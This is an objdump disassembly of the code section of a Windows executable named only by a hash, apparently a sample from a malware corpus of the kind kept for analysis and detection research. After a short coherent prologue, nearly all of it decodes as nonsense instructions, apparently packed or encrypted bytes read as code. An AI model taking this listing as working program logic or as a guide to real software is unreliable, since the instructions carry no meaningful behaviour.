
a23e916813bd636cc51b62c983f9b475327b202a2e3fe805122bd0be6f4e64e4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x448fa8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x448fac
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x448fb0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x448fb4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x448fb8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x448fbc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x448fc0
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x448fc4
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x448fc6
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417000
  4010e9:	test   eax,eax
  4010eb:	je     0x4152d6
  4010f1:	mov    edx,DWORD PTR [ebp-0x10]
  4010f4:	add    edx,0x1
  4010f7:	mov    DWORD PTR [ebp-0x10],edx
  4010fa:	daa    
  4010fb:	gs cld 
  4010fd:	mov    ch,0x71
  4010ff:	jg     0x401092
  401101:	xor    DWORD PTR [eax-0x31520abe],0xffffffb2
  401108:	rcl    DWORD PTR [ecx],0x9c
  40110b:	aas    
  40110c:	and    esp,ecx
  40110e:	frstor [eax]
  401110:	and    BYTE PTR [esi],0x99
  401113:	int3   
  401114:	xchg   ecx,eax
  401115:	xchg   ecx,eax
  401116:	lods   eax,DWORD PTR ds:[esi]
  401117:	adc    BYTE PTR [esi-0x478387dc],0xf7
  40111e:	and    eax,0xffffffcc
  401121:	cmp    al,0x43
  401123:	(bad)  
  401125:	inc    ebx
  401126:	mov    ebx,0xd9eb1ca
  40112b:	push   ds
  40112c:	or     ah,ch
  40112e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40112f:	je     0x401181
  401131:	in     eax,0x98
  401133:	mov    edi,0x9721ce07
  401138:	cld    
  401139:	lods   al,BYTE PTR ds:[esi]
  40113a:	cmp    BYTE PTR [edx],0x2a
  40113d:	les    esi,FWORD PTR [edx-0x28ab1cfd]
  401143:	std    
  401144:	sbb    BYTE PTR [edx-0x3f],0xa9
  401148:	jg     0x401195
  40114a:	and    al,0xa3
  40114c:	dec    esi
  40114d:	daa    
  40114e:	inc    ebx
  40114f:	(bad)  
  401150:	cli    
  401151:	mov    ch,0x67
  401153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401154:	cld    
  401155:	je     0x40110e
  401157:	mov    ss,WORD PTR [edx]
  401159:	xchg   edi,eax
  40115a:	call   0x7176:0x5df763c0
  401161:	iret   
  401162:	addr16 mov ebx,0xeb35a632
  401168:	inc    ebx
  401169:	mov    ah,0x64
  40116b:	jbe    0x40116e
  40116d:	mov    eax,0x71098790
  401172:	add    al,0xc8
  401174:	xchg   esp,eax
  401175:	lock les esp,FWORD PTR [ecx+0x4f4c6b9f]
  40117c:	ret    
  40117d:	lds    edx,FWORD PTR [edx+ebx*8]
  401180:	test   eax,0x346d3e5b
  401185:	gs jns 0x401180
  401188:	jg     0x4011b1
  40118a:	and    esp,DWORD PTR [esi]
  40118c:	retf   0xadb1
  40118f:	jne    0x4011f1
  401191:	stos   BYTE PTR es:[edi],al
  401192:	data16 xor BYTE PTR [eax-0x606e5f27],ch
  401199:	pop    ecx
  40119a:	mul    DWORD PTR [edi]
  40119c:	out    dx,al
  40119d:	(bad)  
  40119e:	ins    BYTE PTR es:[edi],dx
  40119f:	cmp    DWORD PTR [edx-0x5c1efd61],edx
  4011a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011a6:	mov    eax,ds:0x33274c8b
  4011ab:	rol    DWORD PTR [esi+ebx*2],1
  4011ae:	pop    ds
  4011af:	or     eax,0x4162adc7
  4011b4:	adc    al,0x71
  4011b6:	sub    BYTE PTR [ecx+0x70],dh
  4011b9:	pusha  
  4011ba:	ficomp DWORD PTR [edx-0x5]
  4011bd:	mov    eax,ds:0x337efda2
  4011c2:	pop    ebp
  4011c3:	repz jmp 0xc4a80add
  4011c9:	(bad)  
  4011cb:	cli    
  4011cc:	fwait
  4011cd:	ss jmp 0x22cc912a
  4011d3:	push   es
  4011d4:	mov    cl,0x77
  4011d6:	jmp    0x5a33:0x162a603
  4011dd:	pop    ds
  4011de:	add    eax,0xc8b7d60e
  4011e3:	xchg   edx,eax
  4011e4:	push   ebx
  4011e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011e6:	fs push cs
  4011e8:	push   ss
  4011e9:	jge    0x40116c
  4011eb:	in     al,dx
  4011ec:	mov    WORD PTR ds:0xe9d5278d,?
  4011f2:	int3   
  4011f3:	push   esp
  4011f4:	(bad)  
  4011f5:	mov    esp,gs
  4011f7:	loopne 0x4011f8
  4011f9:	ret    
  4011fa:	fsubp  st(3),st
  4011fc:	into   
  4011fd:	adc    ecx,DWORD PTR [edi+edi*8+0x2e]
  401201:	inc    eax
  401202:	xchg   ebx,esi
  401204:	mov    cl,0x90
  401206:	outs   dx,BYTE PTR ds:[esi]
  401207:	inc    ecx
  401208:	mov    dh,0x8e
  40120a:	cld    
  40120b:	mov    WORD PTR [ebp-0x80],gs
  40120e:	stos   DWORD PTR es:[edi],eax
  40120f:	push   edx
  401210:	les    ecx,FWORD PTR [ecx+0x76da1652]
  401216:	adc    eax,0xab780cb0
  40121b:	dec    esi
  40121c:	jnp    0x40129c
  40121e:	xor    ah,BYTE PTR [ebp+0x2b2bbfa8]
  401224:	(bad)  
  401225:	lock pop ebp
  401227:	imul   ebx,DWORD PTR [ecx+0x42],0x18959d8c
  40122e:	pop    ds
  40122f:	pop    eax
  401230:	mov    WORD PTR [edx-0x52],gs
  401233:	out    dx,al
  401234:	rdmsr  
  401236:	lods   al,BYTE PTR ds:[esi]
  401237:	mov    dl,0xea
  401239:	fisubr WORD PTR [ebp-0x6]
  40123c:	cmp    al,0xec
  40123e:	push   0xffffffe3
  401240:	mov    bl,BYTE PTR [esi-0x73]
  401243:	add    BYTE PTR [eax+0x57],ch
  401246:	(bad)
  401249:	sub    dl,0xa6
  40124c:	lods   eax,DWORD PTR ds:[esi]
  40124d:	pop    ebp
  40124e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40124f:	jae    0x401254
  401251:	mov    dh,0x7d
  401253:	fwait
  401254:	push   0x17
  401256:	loopne 0x4011d9
  401258:	mov    ebp,0x4b8b424
  40125d:	sbb    BYTE PTR [edi-0x5],dl
  401260:	loope  0x40125c
  401262:	add    edx,DWORD PTR es:[edi-0x26f530b2]
  401269:	jge    0x40126d
  40126b:	pop    ecx
  40126c:	popf   
  40126d:	outs   dx,DWORD PTR ds:[esi]
  40126e:	xchg   esi,eax
  40126f:	in     al,dx
  401270:	imul   ebx,DWORD PTR [esi-0x4d9a8147],0x61
  401277:	popf   
  401278:	loop   0x40127e
  40127a:	dec    ecx
  40127b:	fisub  DWORD PTR ss:[ebx-0x47]
  40127f:	mov    dh,0xb1
  401281:	adc    BYTE PTR [edi-0x5605adfd],al
  401287:	jns    0x4012fe
  401289:	adc    ch,BYTE PTR [ecx]
  40128b:	jle    0x401275
  40128d:	sbb    BYTE PTR [ecx-0xa774086],0xd9
  401294:	jae    0x401289
  401296:	mov    ch,0x98
  401298:	cld    
  401299:	and    ebx,esi
  40129b:	pushf  
  40129c:	shr    BYTE PTR [ebp+0x7f5375e4],0x45
  4012a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012a4:	in     al,dx
  4012a5:	clc    
  4012a6:	repz lock jge 0x4012e8
  4012aa:	add    eax,0x120544ae
  4012af:	xchg   ebx,eax
  4012b0:	fs fcos 
  4012b3:	in     eax,dx
  4012b4:	cli    
  4012b5:	jl     0x4012d4
  4012b7:	ret    0xf661
  4012ba:	mov    eax,0x9027257c
  4012bf:	dec    edx
  4012c0:	xor    BYTE PTR [edx+0x22b052d],bl
  4012c6:	out    dx,eax
  4012c7:	sbb    BYTE PTR [edi],0xa7
  4012ca:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4012cc:	neg    DWORD PTR [edi-0x2a]
  4012cf:	dec    ebx
  4012d0:	sbb    edi,ecx
  4012d2:	test   BYTE PTR [esi-0x2b],dl
  4012d5:	jns    0x40132d
  4012d7:	ja     0x40127a
  4012d9:	jns    0x401282
  4012db:	loope  0x401262
  4012dd:	xchg   esp,eax
  4012de:	aad    0x8b
  4012e0:	outs   dx,BYTE PTR ds:[esi]
  4012e1:	add    BYTE PTR [edi+0x58c6d6f],cl
  4012e7:	mov    bh,0xdd
  4012e9:	or     edx,DWORD PTR [eax]
  4012eb:	mov    ebp,0x2c96f1c7
  4012f0:	mov    ebx,0xe99199b9
  4012f5:	sbb    ecx,DWORD PTR [ebp-0x1cfb44dd]
  4012fb:	add    ah,bh
  4012fd:	mov    esi,0xbc094e33
  401302:	cmp    esp,DWORD PTR [ebx+0x556c0065]
  401308:	mov    edi,0x37bfbb6d
  40130d:	clc    
  40130e:	add    ebp,0xffffffd1
  401311:	or     al,0xed
  401313:	aad    0x18
  401315:	mov    al,0x2c
  401317:	sub    eax,esi
  401319:	clc    
  40131a:	cli    
  40131b:	sbb    BYTE PTR [edi],0xe4
  40131e:	sub    eax,0xb85a5ea3
  401323:	mov    eax,ds:0x79c254ea
  401328:	jne    0x401308
  40132a:	inc    ebp
  40132b:	pop    ecx
  40132c:	mov    dh,0xe6
  40132e:	push   0x1a
  401330:	xchg   esi,eax
  401331:	arpl   WORD PTR [ecx],dx
  401333:	rcl    DWORD PTR ds:0x5de967a6,1
  401339:	inc    esp
  40133a:	fcos   
  40133c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40133d:	ret    0x8e43
  401340:	andnps xmm7,XMMWORD PTR [ebx]
  401343:	or     eax,0xf3da2326
  401348:	jge    0x4012e4
  40134a:	push   cs
  40134b:	xchg   esp,eax
  40134c:	inc    ebp
  40134d:	(bad)
  401352:	xor    BYTE PTR [esi],al
  401354:	sahf   
  401355:	xchg   edi,eax
  401356:	push   edx
  401357:	xor    ch,BYTE PTR [edx+0x25394f9d]
  40135d:	mov    BYTE PTR [esp+edi*4+0x729d8d57],ch
  401364:	pop    esi
  401365:	test   al,0x5c
  401367:	mov    ebx,0x1753a9c6
  40136c:	or     dh,BYTE PTR [ecx]
  40136e:	out    0x9a,eax
  401370:	shl    DWORD PTR [edi],cl
  401372:	test   BYTE PTR [ebp-0x5c],al
  401375:	nop
  401376:	loope  0x40134c
  401378:	push   edi
  401379:	add    al,0x25
  40137b:	sub    eax,0x8d3c30
  401380:	inc    ecx
  401381:	inc    edi
  401382:	mov    al,0xf8
  401384:	in     eax,0x8
  401386:	out    dx,al
  401387:	jecxz  0x40130f
  401389:	(bad)  
  40138b:	out    dx,al
  40138c:	jecxz  0x401335
  40138e:	adc    eax,0x7010d5de
  401393:	stc    
  401394:	push   edi
  401395:	out    0xe,eax
  401397:	cmp    eax,0x8466a952
  40139c:	repz sub al,0x37
  40139f:	dec    ecx
  4013a0:	push   es
  4013a1:	mov    edi,0x7bf76273
  4013a6:	jl     0x401373
  4013a8:	add    eax,0xfc94c080
  4013ad:	daa    
  4013ae:	xlat   BYTE PTR ds:[ebx]
  4013af:	idiv   BYTE PTR [ecx-0x31]
  4013b2:	add    eax,ebx
  4013b4:	mov    bl,0x33
  4013b6:	mov    bl,0x5d
  4013b8:	mov    al,0x9
  4013ba:	bnd ret 0x816
  4013be:	int    0x9a
  4013c0:	or     eax,0xada3ff53
  4013c5:	test   BYTE PTR [eax+0x18],dl
  4013c8:	xchg   edx,eax
  4013c9:	(bad)  [ecx]
  4013cb:	xchg   edx,eax
  4013cc:	lods   eax,DWORD PTR ds:[esi]
  4013cd:	pop    ebp
  4013ce:	(bad)  
  4013cf:	jl     0x4013f7
  4013d1:	lods   eax,DWORD PTR ds:[esi]
  4013d2:	lock pop ds
  4013d4:	sub    bl,al
  4013d6:	sbb    ebp,DWORD PTR [edi]
  4013d8:	ins    BYTE PTR es:[edi],dx
  4013d9:	sub    DWORD PTR [esi],edi
  4013db:	mov    eax,0x2d3b9982
  4013e0:	repz cwde 
  4013e2:	dec    eax
  4013e3:	jnp    0x40138c
  4013e5:	push   0x38
  4013e7:	dec    ebx
  4013e8:	outs   dx,DWORD PTR ds:[esi]
  4013e9:	ins    DWORD PTR es:[edi],dx
  4013ea:	lods   al,BYTE PTR ss:[esi]
  4013ec:	mov    bh,0x8f
  4013ee:	xor    dh,BYTE PTR [edi+0x2]
  4013f1:	fcom   st(3)
  4013f3:	mov    ebx,0xb83c5380
  4013f8:	cmp    ebp,ecx
  4013fa:	dec    ecx
  4013fb:	hlt    
  4013fc:	mov    BYTE PTR [ebx+0x2],bl
  4013ff:	mov    cl,0x66
  401401:	pop    esp
  401402:	push   esp
  401403:	pop    edi
  401404:	dec    ebx
  401405:	cli    
  401406:	mov    bp,0xf6be
  40140a:	or     al,0x3
  40140c:	add    BYTE PTR [ebp-0x4e851e1b],0xe6
  401413:	out    dx,eax
  401414:	sub    dl,BYTE PTR [edx]
  401416:	int    0xa1
  401418:	(bad)  
  401419:	int    0x8d
  40141b:	test   al,0x2a
  40141d:	mov    cl,BYTE PTR [ebp+0x2dc86d70]
  401423:	(bad)  
  401424:	mov    edx,0xd7422261
  401429:	enter  0x67e1,0x9c
  40142d:	or     eax,0x4260b49
  401432:	test   BYTE PTR [edi-0x2],bh
  401435:	push   es
  401436:	sahf   
  401437:	icebp  
  401438:	icebp  
  401439:	mov    DWORD PTR [ecx+0x74],ebx
  40143c:	mov    ds:0x728ca971,eax
  401441:	or     dl,BYTE PTR [ebx]
  401443:	push   eax
  401444:	(bad)  
  401445:	xchg   edx,eax
  401446:	lods   al,BYTE PTR fs:[esi]
  401448:	sbb    BYTE PTR [edi],0x3b
  40144b:	add    BYTE PTR [ebp-0x8],dl
  40144e:	push   es
  40144f:	jno    0x4013f4
  401451:	shl    ebp,1
  401453:	push   ecx
  401454:	dec    eax
  401455:	dec    ecx
  401456:	xlat   BYTE PTR ds:[ebx]
  401457:	adc    bl,0x41
  40145a:	pop    ds
  40145b:	inc    esp
  40145c:	xchg   ecx,eax
  40145d:	adc    edi,DWORD PTR [edi+0x264c3adc]
  401463:	jae    0x4014c4
  401465:	iret   
  401466:	inc    ebx
  401467:	test   al,0x5c
  401469:	add    al,BYTE PTR [edx]
  40146b:	jg     0x40145f
  40146d:	add    ah,ch
  40146f:	test   al,0x54
  401471:	in     eax,0x3f
  401473:	sbb    DWORD PTR [ebp*4+0x603b2bd3],esp
  40147a:	and    al,0x79
  40147c:	sahf   
  40147d:	out    dx,al
  40147e:	pop    eax
  40147f:	xor    bl,BYTE PTR [ecx]
  401481:	xlat   BYTE PTR ds:[ebx]
  401482:	ja     0x40144b
  401484:	out    0xc,al
  401486:	mov    dl,0x97
  401488:	jg     0x40145c
  40148a:	lods   al,BYTE PTR ds:[esi]
  40148b:	scas   eax,DWORD PTR es:[edi]
  40148c:	outs   dx,DWORD PTR ds:[esi]
  40148d:	cmp    edx,esi
  40148f:	sbb    esp,edi
  401491:	sar    esi,0x64
  401494:	mov    cl,0xa
  401496:	bound  eax,QWORD PTR [ebx]
  401498:	adc    al,0x6a
  40149a:	sar    al,1
  40149c:	shl    bh,1
  40149e:	fs add eax,0x659cc539
  4014a4:	cmp    ebp,DWORD PTR [edx*1+0x36f78f31]
  4014ab:	aas    
  4014ac:	sbb    BYTE PTR [esi-0x42031a77],dh
  4014b2:	pop    es
  4014b3:	cs jmp 0x9db82ab3
  4014b9:	sti    
  4014ba:	jae    0x4014a6
  4014bc:	push   ds
  4014bd:	stos   BYTE PTR es:[edi],al
  4014be:	cdq    
  4014bf:	retf   0x8ce6
  4014c2:	add    esi,ecx
  4014c4:	mov    ds:0xf253cece,eax
  4014c9:	rcl    esp,1
  4014cb:	jmp    0x49c3e07a
  4014d0:	out    dx,eax
  4014d1:	push   cs
  4014d2:	or     eax,DWORD PTR [esi+0x4b]
  4014d5:	fcomp  DWORD PTR [esi+eiz*2]
  4014d8:	or     al,0x48
  4014da:	lahf   
  4014db:	cmp    DWORD PTR [ecx+0x3d],0xc7a424cc
  4014e2:	js     0x40149b
  4014e4:	ret    0xd5f5
  4014e7:	outs   dx,DWORD PTR ds:[esi]
  4014e8:	out    0x6f,eax
  4014ea:	pop    eax
  4014eb:	push   ebp
  4014ec:	mov    fs,edx
  4014ee:	fist   DWORD PTR [eax+0x5]
  4014f1:	ud0    edi,DWORD PTR [ecx+0x4e]
  4014f5:	repz jp 0x40154c
  4014f8:	sahf   
  4014f9:	sbb    BYTE PTR [ebp+0x5d],0xbf
  4014fd:	daa    
  4014fe:	or     eax,0x3e33026d
  401503:	xlat   BYTE PTR ds:[ebx]
  401504:	cmp    BYTE PTR [esi+eax*4],bh
  401507:	jmp    0x4014c2
  401509:	arpl   WORD PTR [esi],bp
  40150b:	xchg   esp,eax
  40150c:	(bad)  
  40150d:	mov    WORD PTR [esi+0x4b9a02b8],ds
  401513:	mov    dh,BYTE PTR [ebp+0x59a1b481]
  401519:	dec    eax
  40151a:	pop    ecx
  40151b:	fs (bad) 
  40151d:	out    0x91,eax
  40151f:	std    
  401520:	push   ebx
  401521:	pop    ds
  401522:	mov    ch,0x84
  401524:	mov    ds:0xac01a042,al
  401529:	add    dh,BYTE PTR [esi+0x249712fb]
  40152f:	xchg   edx,eax
  401530:	test   BYTE PTR [eax+0x3b],ah
  401533:	mov    bh,0xad
  401535:	add    eax,0x9ae1833b
  40153a:	and    BYTE PTR [eax-0x41611fe3],al
  401540:	cmp    al,0x46
  401542:	call   0x8e7f:0xdc6e9779
  401549:	rcr    BYTE PTR [ecx-0x4c],1
  40154c:	jecxz  0x401598
  40154e:	(bad)  
  40154f:	fs push es
  401551:	lds    edx,FWORD PTR [edi]
  401553:	fnstcw WORD PTR [ecx+eiz*2+0x2b]
  401557:	(bad)  
  401558:	(bad)  
  401559:	adc    eax,0xc4dc8a31
  40155e:	int    0x13
  401560:	mov    DWORD PTR [edx-0x10],ebx
  401563:	pop    esi
  401564:	addr16 add cl,ch
  401567:	retf   0x92bd
  40156a:	std    
  40156b:	out    0xe6,al
  40156d:	ds (bad) 
  40156f:	push   edi
  401570:	outs   dx,DWORD PTR ds:[esi]
  401571:	loope  0x401599
  401573:	call   0x54e8b334
  401578:	std    
  401579:	aaa    
  40157a:	jae    0x40157e
  40157c:	int3   
  40157d:	(bad)  
  40157e:	repnz shl BYTE PTR [eax],cl
  401581:	xchg   esp,eax
  401582:	xlat   BYTE PTR ds:[ebx]
  401583:	push   ecx
  401584:	pushf  
  401585:	push   ss
  401586:	fisub  WORD PTR [edi+0xdfc6b6f]
  40158c:	push   esp
  40158d:	and    ecx,DWORD PTR [ecx-0x3d]
  401590:	push   ds
  401591:	mov    bl,0x89
  401593:	neg    BYTE PTR [eax]
  401595:	gs dec ebx
  401597:	faddp  st(6),st
  401599:	dec    esi
  40159a:	out    0x4b,eax
  40159c:	loop   0x4015a5
  40159e:	bound  edx,QWORD PTR [edx-0x76]
  4015a1:	add    al,BYTE PTR [edx+0x41]
  4015a4:	push   ebp
  4015a5:	xor    al,0x44
  4015a7:	repnz sub eax,0x354ef43d
  4015ad:	ret    0x97d4
  4015b0:	mov    esp,0x3d63687
  4015b5:	sti    
  4015b6:	ror    DWORD PTR [edi],cl
  4015b8:	sbb    eax,0xaad5e255
  4015bd:	adc    BYTE PTR [ebx+0x33],0xfc
  4015c1:	lods   al,BYTE PTR ds:[esi]
  4015c2:	cld    
  4015c3:	loop   0x40156d
  4015c5:	xchg   ecx,eax
  4015c6:	push   eax
  4015c7:	cmc    
  4015c8:	outs   dx,BYTE PTR ds:[esi]
  4015c9:	ins    DWORD PTR es:[edi],dx
  4015ca:	nop
  4015cb:	mov    ch,0x23
  4015cd:	adc    DWORD PTR [ecx],0xf560c975
  4015d3:	push   esp
  4015d4:	or     dh,BYTE PTR [esi+0x360e2a54]
  4015da:	pusha  
  4015db:	test   eax,0x6daa944b
  4015e0:	xchg   ebp,eax
  4015e1:	pushf  
  4015e2:	sbb    al,BYTE PTR [ebx]
  4015e4:	push   esi
  4015e5:	push   ds
  4015e6:	jno    0x4015b0
  4015e8:	gs aaa 
  4015ea:	add    edi,edx
  4015ec:	gs mov al,0xd5
  4015ef:	ret    0x416d
  4015f2:	mov    ?,WORD PTR [esp+eax*1-0x25]
  4015f6:	jo     0x4015a7
  4015f8:	push   esi
  4015f9:	and    edi,DWORD PTR [ebx+edx*2-0x7d5970cb]
  401600:	icebp  
  401601:	(bad)  
  401602:	stos   DWORD PTR es:[edi],eax
  401603:	push   edi
  401604:	sti    
  401605:	jl     0x401612
  401607:	hlt    
  401608:	inc    esi
  401609:	sub    al,0xe1
  40160b:	test   al,0x52
  40160d:	sub    DWORD PTR [eax+0x4d],0xc5bdb248
  401614:	xchg   ebx,eax
  401615:	sub    al,0x55
  401617:	shl    DWORD PTR [edx],cl
  401619:	std    
  40161a:	or     dl,BYTE PTR [esi]
  40161c:	inc    edi
  40161d:	sub    DWORD PTR [esi+eax*1-0x43dd3b5c],edx
  401624:	test   eax,0xb3404d6a
  401629:	icebp  
  40162a:	and    DWORD PTR [edx+eax*8+0x7d1e5215],ebp
  401631:	sub    ecx,DWORD PTR [edi]
  401633:	je     0x4016ad
  401635:	xchg   edi,eax
  401637:	rcl    ah,0xb3
  40163a:	in     eax,0x93
  40163c:	je     0x4015f6
  40163e:	sbb    eax,0x16ce2df3
  401643:	dec    ebp
  401644:	pop    edi
  401645:	inc    edx
  401646:	xchg   ebx,eax
  401647:	fs adc al,0x7c
  40164a:	jbe    0x401698
  40164c:	xchg   ebp,eax
  40164d:	jle    0x4016b6
  40164f:	out    dx,al
  401650:	retf   0x65d9
  401653:	js     0x40161c
  401655:	in     eax,0xbf
  401657:	jne    0x4016d5
  401659:	scas   eax,DWORD PTR es:[edi]
  40165a:	pusha  
  40165b:	cld    
  40165c:	mov    ebx,fs
  40165e:	add    BYTE PTR [ebp+eax*4-0x1e],dh
  401662:	mov    ecx,0x7758904d
  401667:	and    eax,0xedd8f1b5
  40166c:	out    dx,al
  40166d:	sbb    DWORD PTR [ecx+esi*8],edi
  401670:	lods   al,BYTE PTR ds:[esi]
  401671:	rcr    DWORD PTR [ecx+0x7df7be7d],cl
  401677:	jns    0x40163f
  401679:	push   ds
  40167a:	xor    bl,BYTE PTR [ecx-0x31a97130]
  401680:	cmp    eax,0xafbb69e6
  401685:	ins    BYTE PTR es:[edi],dx
  401686:	adc    al,0xc1
  401688:	out    dx,al
  401689:	adc    BYTE PTR [edx],dl
  40168b:	jnp    0x4016c5
  40168d:	cs push ds
  40168f:	mov    dl,0x74
  401691:	jne    0x401711
  401693:	sub    al,0xa8
  401695:	das    
  401696:	xchg   edi,eax
  401697:	repnz mov edi,0xd702fa32
  40169d:	stc    
  40169e:	adc    ah,dh
  4016a0:	jge    0x40164d
  4016a2:	stc    
  4016a3:	adc    esi,edi
  4016a5:	xor    ebx,edx
  4016a7:	pop    edi
  4016a8:	(bad)
  4016ab:	es jge 0x4016c2
  4016ae:	jecxz  0x4016e5
  4016b0:	inc    esp
  4016b1:	push   edi
  4016b2:	cmc    
  4016b3:	call   0x2702:0x6a72ca46
  4016ba:	sbb    edx,DWORD PTR [edi+0x40]
  4016bd:	test   al,0x49
  4016bf:	ja     0x4016ee
  4016c1:	ins    BYTE PTR es:[edi],dx
  4016c2:	inc    esi
  4016c3:	or     DWORD PTR [ebp-0x6c],esp
  4016c6:	ja     0x4016b3
  4016c8:	jno    0x401707
  4016ca:	test   al,0x46
  4016cc:	icebp  
  4016cd:	in     al,dx
  4016ce:	push   0x5a
  4016d0:	stc    
  4016d1:	pop    ss
  4016d2:	fistp  WORD PTR [edi+0x7c]
  4016d5:	and    al,0x72
  4016d7:	sbb    al,0xb1
  4016d9:	inc    eax
  4016da:	mov    ch,0xf1
  4016dc:	(bad)  
  4016dd:	mov    eax,ds:0x53925f04
  4016e2:	(bad)  
  4016e3:	(bad)  
  4016e4:	enter  0xaee3,0xba
  4016e8:	pop    edx
  4016e9:	cmp    ah,BYTE PTR [ebx]
  4016eb:	push   ss
  4016ec:	leave  
  4016ed:	mov    dh,0xac
  4016ef:	push   esi
  4016f0:	or     eax,0x79ebb2ae
  4016f5:	mov    eax,0xa0285c37
  4016fa:	dec    esi
  4016fb:	jge    0x4016d6
  4016fd:	sub    ebp,DWORD PTR [edi+0x7a]
  401700:	inc    esi
  401701:	out    0x22,al
  401703:	push   es
  401704:	xchg   esp,eax
  401705:	(bad)  
  401706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401707:	add    ch,BYTE PTR [esi]
  401709:	push   ebp
  40170a:	mov    ds:0xce0e975f,eax
  40170f:	vpunpckldq ymm5,ymm7,YMMWORD PTR [ecx-0x64]
  401714:	ret    0xa288
  401717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401718:	push   ebp
  401719:	jb     0x401762
  40171b:	mov    dl,BYTE PTR [esi]
  40171d:	mov    al,0xf6
  40171f:	mov    ecx,DWORD PTR es:0x1c4a86da
  401726:	imul   edx,DWORD PTR [ecx+edx*1-0x21],0xe
  40172b:	inc    ebp
  40172c:	and    eax,0x7b5e3dd2
  401731:	fwait
  401732:	add    BYTE PTR [eax+0x10],ah
  401735:	sti    
  401736:	fst    QWORD PTR [edx+0x17e3cbcc]
  40173c:	rol    bl,1
  40173e:	ins    DWORD PTR es:[edi],dx
  40173f:	jl     0x401718
  401741:	popf   
  401742:	(bad)  [ecx+0x46]
  401745:	ins    DWORD PTR es:[edi],dx
  401746:	jno    0x401762
  401748:	std    
  401749:	scas   eax,DWORD PTR es:[edi]
  40174a:	mov    al,ds:0xaa050af2
  40174f:	das    
  401750:	scas   al,BYTE PTR es:[edi]
  401751:	mov    gs,WORD PTR [esi-0x74]
  401754:	popf   
  401755:	fwait
  401756:	sbb    al,al
  401758:	and    BYTE PTR ds:0x990b375f,0x7c
  40175f:	push   ebx
  401760:	push   ebp
  401761:	lahf   
  401762:	mov    al,ds:0xf33f7123
  401767:	sbb    eax,0x25e4ebbc
  40176c:	in     al,dx
  40176d:	aad    0x92
  40176f:	sbb    BYTE PTR [edi-0x53],dh
  401772:	jno    0x401777
  401774:	jns    0x40177f
  401776:	aad    0x8b
  401778:	push   esp
  401779:	push   es
  40177a:	inc    ecx
  40177b:	push   ebp
  40177c:	cmp    eax,0x8f75eab8
  401781:	nop
  401782:	and    eax,0xd45fadbc
  401787:	cs jge 0x4017ef
  40178a:	xchg   esp,eax
  40178b:	jns    0x40179f
  40178d:	mov    ecx,0xa9df1797
  401792:	xchg   DWORD PTR [esi],esp
  401794:	mov    ah,0xa6
  401796:	into   
  401797:	out    dx,al
  401798:	int3   
  401799:	jae    0x40174d
  40179b:	xlat   BYTE PTR ds:[ebx]
  40179c:	mov    esp,0x3080940c
  4017a1:	arpl   WORD PTR [edx+0xff83e31],sp
  4017a7:	shl    bh,cl
  4017a9:	mov    bl,0x0
  4017ab:	fs out 0x1,al
  4017ae:	test   DWORD PTR [eax+0x3a],0x4286c956
  4017b5:	iret   
  4017b6:	sub    al,0xb7
  4017b8:	lods   al,BYTE PTR ds:[esi]
  4017b9:	ds pop esi
  4017bb:	pop    ds
  4017bc:	dec    edi
  4017bd:	sbb    eax,0xc343bb75
  4017c2:	and    ebp,0x17cf7a16
  4017c8:	or     dh,BYTE PTR [eax]
  4017ca:	popa   
  4017cb:	lea    ebx,[eax+0x64a7c362]
  4017d1:	push   ebx
  4017d2:	loope  0x4017d9
  4017d4:	int    0xef
  4017d6:	sbb    al,0xe3
  4017d8:	mov    ah,BYTE PTR [edi-0x5c]
  4017db:	and    al,0x42
  4017dd:	sbb    al,0x97
  4017df:	push   ebp
  4017e0:	dec    ecx
  4017e1:	sub    bl,BYTE PTR [edx-0x23]
  4017e4:	xchg   DWORD PTR ds:0xae8a5f01,edi
  4017ea:	pop    ds
